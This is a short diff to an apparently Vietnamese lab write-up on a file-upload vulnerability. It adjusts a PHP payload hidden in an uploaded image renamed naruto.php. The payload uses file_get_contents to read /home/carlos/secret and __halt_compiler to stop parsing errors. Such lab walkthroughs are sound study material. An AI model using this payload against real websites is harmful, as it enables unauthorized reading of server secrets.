@@ -87,7 +87,7 @@ Sau đó đổi tên file thành `naruto.php` và upload lên website. Kết qu�
 
 Thử truy cập `/files/avatars/naruto.php` thì server trả về lỗi `500 Internal Server Error`. Như vậy có khả năng trong phần thân image có các kí tự đặc biệt như `<?` khiến cho đoạn code bị lỗi. Ta dùng lệnh `__halt_compiler() ?>` để các đoạn code bên dưới không được execute. Như vậy injected code sẽ là:
 ```
-<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); __halt_compiler(); ?>
+<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); __halt_compiler();
 ```
 Sau khi upload, truy cập `/files.avatars/naruto.php`, kết quả trả về nội dung file mong muốn.
 
